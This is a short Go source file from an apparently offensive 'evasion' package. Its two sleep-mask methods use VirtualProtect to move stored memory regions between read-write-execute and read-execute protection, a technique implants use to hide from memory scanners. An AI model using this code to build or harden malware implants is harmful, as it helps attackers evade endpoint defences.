//go:build windows

package evasion

import (
	"syscall"
	"unsafe"
)

const (
	PAGE_EXECUTE_READ = 0x20
	PAGE_EXECUTE_READWRITE = 0x40
)

var (
	kernel32                 = syscall.NewLazyDLL("kernel32.dll")
	procVirtualProtect       = kernel32.NewProc("VirtualProtect")
)

// lockMemoryRegions changes memory protection from RWX to RX using VirtualProtect.
func (sm *SleepMask) lockMemoryRegions() {
	for i := range sm.regions {
		r := &sm.regions[i]
		if r.size == 0 {
			continue
		}
		var oldProtect uint32
		procVirtualProtect.Call(
			r.addr,
			uintptr(r.size),
			PAGE_EXECUTE_READ,
			uintptr(unsafe.Pointer(&oldProtect)),
		)
	}
}

// unlockMemoryRegions changes memory protection from RX back to RWX.
func (sm *SleepMask) unlockMemoryRegions() {
	for i := range sm.regions {
		r := &sm.regions[i]
		if r.size == 0 {
			continue
		}
		var oldProtect uint32
		procVirtualProtect.Call(
			r.addr,
			uintptr(r.size),
			PAGE_EXECUTE_READWRITE,
			uintptr(unsafe.Pointer(&oldProtect)),
		)
	}
}
